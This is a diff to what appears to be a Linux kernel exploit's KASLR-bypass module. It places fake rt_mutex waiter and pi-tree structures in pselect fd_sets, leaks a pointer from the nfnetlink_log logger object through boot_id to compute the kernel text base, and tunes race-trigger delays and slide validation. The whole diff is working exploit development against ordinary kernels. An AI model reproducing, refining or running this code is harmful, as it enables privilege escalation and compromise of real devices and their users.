@@ -167,12 +167,12 @@ void prepare_slide_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
     {4, 0, "pi_right"},
     {5, slide_oracle_target, "pi_left"},
 #else
-    {0, SLIDE_LOGGERS_0_1 + slide_p0_offset, "tree_pc"},
+    {0, SLIDE_NFULNL_LOGGER_OBJECT + slide_p0_offset, "tree_pc"},
     {1, 0, "tree_right"},
     {2, SLIDE_WAITER_TREE_LEFT + slide_p0_offset, "tree_left"},
-    {3, SLIDE_LOGGERS_0_1 + slide_p0_offset, "pi_pc"},
+    {3, SLIDE_NFULNL_LOGGER_OBJECT + slide_p0_offset, "pi_pc"},
     {4, 0, "pi_right"},
-    {5, SLIDE_RANDOM_BOOT_ID_DATA + slide_p0_offset, "pi_left"},
+    {5, SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR + slide_p0_offset, "pi_left"},
 #endif
 #if defined(SLIDE_USE_FAKE_TASK) && SLIDE_USE_FAKE_TASK
     {6, fake_task, "task"},
@@ -201,13 +201,13 @@ void prepare_slide_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
     {6, 0, "pi1"},
     {7, slide_oracle_target, "pi2"},
 #else
-    {0, SLIDE_LOGGERS_0_1 + slide_p0_offset, "tree_pc"},
+    {0, SLIDE_NFULNL_LOGGER_OBJECT + slide_p0_offset, "tree_pc"},
     {1, 0, "tree_right"},
     {2, SLIDE_WAITER_TREE_LEFT + slide_p0_offset, "tree_left"},
     {3, FAKE_WAITER_PRIO, "tree_prio"},
-    {5, SLIDE_LOGGERS_0_1 + slide_p0_offset, "pi0"},
+    {5, SLIDE_NFULNL_LOGGER_OBJECT + slide_p0_offset, "pi0"},
     {6, 0, "pi1"},
-    {7, SLIDE_RANDOM_BOOT_ID_DATA + slide_p0_offset, "pi2"},
+    {7, SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR + slide_p0_offset, "pi2"},
 #endif
     {8, FAKE_WAITER_PRIO, "pi_prio"},
     {9, 0, "pi_deadline"},
@@ -526,7 +526,7 @@ uint64_t slide_read_stext(void) {
     return 0;
   }
 
-  uint64_t off = 0x008fabd8ULL;
+  uint64_t off = p0_alias_image_offset(SLIDE_NFULNL_LOGGER_NAME);
   uint64_t stext = leaked - off;
   pr_success("slide boot_id_leaked_nfulnl_logger pid=%d value=%016llx stext=%016llx\n",
              getpid(), (unsigned long long)leaked, (unsigned long long)stext);
@@ -677,8 +677,8 @@ static int slide_restore_physical_oracle(void) {
 int app_trigger_fops_slide_route(void) {
   static size_t delay_index;
   static const int delays[] = {
-    35000, 30000, 40000, 20000, 45000, 25000,
-    15000, 10000, 37500, 32500, 42500, 27500,
+    70000, 60000, 80000, 40000, 90000, 50000,
+    30000, 20000, 75000, 65000, 85000, 55000,
   };
   if (!select_slide_payload_index(0)) {
     return 0;
@@ -740,7 +740,6 @@ static int slide_leak_physical_base(void) {
   }
   size_t elapsed_ms = (size_t)((gettime_ns() - started) / 1000000ULL);
   pr_success("p0 physical elapsed_ms=%zu\n", elapsed_ms);
-  pr_info("p0 physical scanned offset=%08zx\n", offset);
   return slide_commit_stext(KIMAGE_TEXT_BASE + offset, "physical");
 }
 
@@ -898,12 +897,11 @@ int run_p0_pipe_oracle_diagnostic(int fd) {
 #endif
 
 static int slide_commit_stext(uint64_t stext, const char *source) {
-  pr_info("slide_commit_stext called stext=%016llx source=%s\n", (unsigned long long)stext, source);
   if (stext < KIMAGE_TEXT_BASE) {
     return 0;
   }
   uint64_t slide = stext - KIMAGE_TEXT_BASE;
-  if (slide > 0x200000ULL || (slide & 0xfffULL) != 0) {
+  if (slide > 0x1f0000ULL || (slide & 0xffffULL) != 0) {
     pr_warning("slide rejected source=%s stext=%016llx slide=%016llx\n",
                source, (unsigned long long)stext,
                (unsigned long long)slide);
@@ -1006,9 +1004,9 @@ int slide_leak_kernel_base(void) {
     pr_info("slide attempt %d/%d p0_offset=%08zx logger_parent=%016llx "
             "bootid_target=%016llx\n",
             attempt, max_attempts, slide_p0_offset,
-            (unsigned long long)(SLIDE_LOGGERS_0_1 + slide_p0_offset),
+            (unsigned long long)(SLIDE_NFULNL_LOGGER_OBJECT + slide_p0_offset),
             (unsigned long long)(
-                SLIDE_RANDOM_BOOT_ID_DATA + slide_p0_offset));
+                SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR + slide_p0_offset));
 #if defined(APP_PAYLOAD) && APP_PAYLOAD && \
     defined(SLIDE_P0_OFFSET_CANDIDATES)
     if (!select_slide_payload_slot(slide_p0_offset)) {
